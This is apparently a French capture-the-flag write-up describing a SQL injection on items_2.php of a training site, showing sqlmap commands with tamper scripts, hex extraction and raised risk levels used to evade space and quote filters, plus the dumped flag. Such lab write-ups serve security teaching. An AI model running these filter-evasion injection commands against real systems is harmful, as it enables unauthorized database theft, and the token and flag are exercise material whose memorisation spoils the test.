@@ -1,0 +1,97 @@
+Compte Rendu – SQL Injection sur items_2.php
+1. Contexte
+Objectif : Exploiter une injection SQL dans la page items_2.php afin de récupérer le contenu de la table flag_solution_cyber de la base bdd2.
+
+Restrictions :
+- Filtrage des espaces, des guillemets simples et doubles.
+- Présence possible d’un WAF ou de filtres côté serveur.
+
+Paramètre vulnérable : category.
+
+2. Analyse initiale et découvertes
+Tentatives manuelles :
+
+Injection de payloads (' OR 1=1 --, etc.) dans le paramètre category.
+
+Vérification des messages d’erreur et des réponses du serveur.
+
+Utilisation de SQLMap :
+
+Commande de base pour détecter l’injection :
+
+sqlmap -u "https://web2.cyber-learning.fr/items_2.php?jeton=tL3MCTIRAo7&category=1" --batch --dbs --tables
+
+Découverte de la base de données bdd2 et de la table flag_solution_cyber, malgré des difficultés pour dumper son contenu.
+
+Filtrage agressif :
+
+Les espaces, guillemets et certains caractères spéciaux sont bloqués.
+
+sqlmap échouait à récupérer directement les données de la table.
+
+3. Contournements et Paramétrages Avancés
+Augmentation du niveau et du risque :
+L’utilisation de --level=5 --risk=3 permet à SQLMap de tester davantage de techniques d’injection, y compris des payloads plus complexes.
+
+Tamper Scripts :
+Nous avons cumulé plusieurs scripts de contournement :
+
+space2comment : Remplace les espaces par des commentaires SQL (/**/).
+
+between : Introduit des expressions BETWEEN pour contourner les filtres.
+
+apostrophemask : Masque/applique des transformations sur l’apostrophe (').
+
+Extraction en hexadécimal :
+L’option --hex est parfois nécessaire pour contourner les filtres sur les caractères non alphanumériques.
+
+Threads et no-cast :
+
+--threads=5 : Permet d’exploiter plusieurs requêtes en parallèle.
+
+--no-cast : Évite les conversions automatiques de types qui peuvent être bloquées.
+
+4. Commande Décisive
+La commande SQLMap suivante a finalement permis de dumper la table malgré les restrictions :
+
+sqlmap \
+  -u "https://web2.cyber-learning.fr/items_2.php?jeton=tL3MCTIRAo7&category=1" \
+  --batch \
+  --level=5 \
+  --risk=3 \
+  --threads=5 \
+  --tamper=space2comment,between,apostrophemask \
+  --hex \
+  -D bdd2 \
+  -T flag_solution_cyber \
+  --dump
+Résultat :
+SQLMap a récupéré près de 9000 entrées, dont la plupart contenaient la mention « trop tard... ». Mais, en fouillant le fichier CSV généré, nous avons trouvé la ligne correspondant au jeton et contenant le flag.
+
+5. Récupération du Flag
+Fichier CSV :
+SQLMap a généré un fichier CSV dans son répertoire de sortie :
+
+C:\Users\Administrateur\AppData\Local\sqlmap\output\web2.cyber-learning.fr\dump\bdd2\flag_solution_cyber.csv
+Recherche :
+En ouvrant ce fichier et en recherchant le jeton (tL3MCTIRAo7), nous avons identifié l’entrée de table contenant la valeur du flag dans la colonne flag_a_utiliser.
+
+Extrait du CSV :
+
+497395,tL3MCTIRAo7,2025-03-27 12:40:58,R2cnxHT
+
+Ce qui indique que le flag est :
+R2cnxHT
+
+6. Conclusion
+Grâce à :
+
+L’augmentation du niveau et du risque (--level=5 --risk=3),
+L’utilisation de scripts de contournement (--tamper=space2comment,between,apostrophemask),
+L’extraction en hexadécimal (--hex),
+Ainsi qu’une analyse manuelle approfondie des résultats (fichier CSV),
+il a été possible de contourner les filtres et de récupérer le contenu exact de la table flag_solution_cyber.
+
+Flag final : R2cnxHT
+
+Cette approche montre l’importance de personnaliser les requêtes SQLMap et de combiner différentes techniques de contournement pour venir à bout de WAF ou de filtres agressifs.
